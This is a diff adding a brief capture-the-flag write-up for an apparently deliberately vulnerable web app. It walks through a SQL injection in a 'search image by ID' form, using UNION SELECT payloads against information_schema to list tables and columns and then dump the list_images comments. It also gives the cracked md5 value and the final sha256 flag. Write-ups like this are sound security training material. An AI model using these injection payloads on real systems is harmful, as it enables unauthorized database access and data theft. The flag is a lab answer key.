@@ -1,0 +1,16 @@
+list_images
+
+on the searchimg page you can perfom a sql injection with the following lines in the SEARCH IMG BY ID form,
+
+get all imgs with : 1 OR 1=1 we find this img called Hack me ? with the id 5
+get all tables with : 1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables
+-> we find the list_images table
+get all colums with : 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
+-> we find the title and comment column in the list_images table
+get all img and their comments with : 1 OR 1=1 UNION SELECT title, comment FROM list_images
+
+
+comment == If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+after md5 decode == albatroz
+after sha256 == F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188
